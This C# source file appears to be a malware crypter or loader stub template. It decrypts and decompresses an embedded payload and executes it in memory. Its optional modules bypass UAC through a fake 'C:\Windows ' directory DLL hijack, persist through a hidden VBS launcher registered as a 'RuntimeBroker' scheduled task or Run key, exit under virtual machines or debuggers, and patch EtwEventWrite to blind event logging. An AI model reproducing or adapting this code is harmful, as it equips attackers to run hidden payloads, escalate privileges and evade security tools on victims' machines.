using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Management;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;

namespace namespace_name
{
    internal class class_name
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

#if ANTI_DEBUG
        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();
#endif

#if NATIVE
        private delegate void NativeEntryPointDelegate();
#endif

        private static uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            string currentfilename = Process.GetCurrentProcess().MainModule.FileName;

#if UAC_BYPASS
            Version osversion = Environment.OSVersion.Version;
            if ((osversion.Major >= 6 && osversion.Minor >= 1) || osversion.Major >= 10)
            {
                try
                {
                    if (!IsAdmin())
                    {
                        Directory.CreateDirectory("\\\\?\\C:\\Windows \\System32");
                        File.Copy("C:\\Windows\\System32\\wusa.exe", "C:\\Windows \\System32\\wusa.exe", true);
                        File.WriteAllBytes("C:\\Windows \\System32\\WTSAPI32.dll", uncompressfunction_name(getembeddedresourcefunction_name(@"UAC")));
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "C:\\Windows \\System32\\wusa.exe",
                            Arguments = "\"" + Console.Title + "\"",
                            UseShellExecute = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        Environment.Exit(-1);
                    }
                    Directory.Delete("\\\\?\\C:\\Windows ", true);
                }
                catch
                {
                }
            }
#endif

#if STARTUP
            try
            {
                bool isStartup = IsStartup(Console.Title);
                if (!isStartup)
                {
                    InstallStartup(Console.Title);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
                Process.GetCurrentProcess().Kill();
            }
#endif

#if ANTI_VM
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"Select * from Win32_ComputerSystem");
            ManagementObjectCollection instances = searcher.Get();
            foreach (ManagementBaseObject inst in instances)
            {
                string manufacturer = inst[@"Manufacturer"].ToString().ToLower();
                if ((manufacturer == @"microsoft corporation" && inst[@"Model"].ToString().ToUpperInvariant().Contains(@"VIRTUAL")) || manufacturer.Contains(@"vmware") || inst[@"Model"].ToString() == @"VirtualBox")
                {
                    Environment.Exit(1);
                }
            }
            searcher.Dispose();
#endif

#if ANTI_DEBUG
            bool remotedebug = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent())
            {
                Environment.Exit(-1);
            }
#endif

            IntPtr ntdll = LoadLibrary(@"ntdll.dll");
            IntPtr etwaddr = GetProcAddress(ntdll, @"EtwEventWrite");
            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xC3 } : new byte[] { 0xC2, 0x14, 0x00 };
            uint oldProtect;
            VirtualProtect(etwaddr, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
            Marshal.Copy(Patch, 0, etwaddr, Patch.Length);
            VirtualProtect(etwaddr, (UIntPtr)Patch.Length, oldProtect, out oldProtect);

            string payloadstr = @"payload.exe";
            
            Assembly asm = Assembly.GetExecutingAssembly();
            foreach (string name in asm.GetManifestResourceNames())
            {
                if (name == payloadstr || name == @"UAC")
                {
                    continue;
                }
                if (name.EndsWith(@".exe") || name.EndsWith(@".bat"))
                {
                    try
                    {
                        File.WriteAllBytes(name, getembeddedresourcefunction_name(name));
                        File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
                        new Thread(() =>
                        {
                            Process.Start(name).WaitForExit();
                            File.SetAttributes(name, FileAttributes.Normal);
                            File.Delete(name);
                        }).Start();
                    }
                    catch
                    {
                    }
                }
            }

            byte[] payload = uncompressfunction_name(aesfunction_name(getembeddedresourcefunction_name(payloadstr), Convert.FromBase64String(@"key_str"), Convert.FromBase64String(@"iv_str")));
            string[] targs = new string[] { };
            try
            {
                targs = args[0].Split(' ');
            }
            catch
            {
            }

#if NATIVE
            unsafe
            {
                fixed (byte* _pointer = payload)
                {
                    IntPtr _mem = (IntPtr)_pointer;
                    VirtualProtect(_mem, (UIntPtr)payload.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
                    NativeEntryPointDelegate NativeExecute = (NativeEntryPointDelegate)Marshal.GetDelegateForFunctionPointer(_mem, typeof(NativeEntryPointDelegate));
                    NativeExecute();
                    Environment.Exit(-1);
                }
            }
#else
            MethodInfo entry = Assembly.Load(payload).EntryPoint;
            try { entry.Invoke(null, new object[] { targs }); }
            catch { entry.Invoke(null, null); }
#endif
        }

        private static bool IsAdmin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

#if STARTUP
        private static bool IsStartup(string path)
        {
            if (path.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) == true)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        private static void InstallStartup(string batPath)
        {
            string currentfileextension = ".bat";
            string randomvar = new Random().Next(1, 1000).ToString();
            string newpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\startup_str_" + randomvar + currentfileextension;
            string newVpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\startup_str_" + randomvar + @".vbs";
            File.WriteAllText(newVpath, "CreateObject(Replace(\"WScript.Shell\",\"SubChar\",\"\")).Run \"\"\"" + newpath + "\"\"\", 0");
            if (IsAdmin())
            {
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = "Register-ScheduledTask -TaskName 'RuntimeBroker_startup_" + randomvar + "_str' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '" + newVpath + "') -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -ExecutionTimeLimit 0) -RunLevel Highest -Force",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                }).WaitForExit();
            }
            else
            {
                var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("RuntimeBroker_startup_" + randomvar + @"_str", "wscript.exe \"" + newVpath + "\"");
                key.Dispose();
            }
            if (batPath.IndexOf(newpath, StringComparison.OrdinalIgnoreCase) == 0) return;
            File.Copy(batPath, newpath, true);
            Process.Start(newVpath);
            Environment.Exit(-1);
        }
#endif

        private static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
        {
            AesManaged aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);
            decryptor.Dispose();
            aes.Dispose();
            return decrypted;
        }

        private static byte[] uncompressfunction_name(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
            gs.CopyTo(mso);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }

        private static byte[] getembeddedresourcefunction_name(string name)
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            MemoryStream ms = new MemoryStream();
            Stream stream = asm.GetManifestResourceStream(name);
            stream.CopyTo(ms);
            stream.Dispose();
            byte[] ret = ms.ToArray();
            ms.Dispose();
            return ret;
        }
    }
}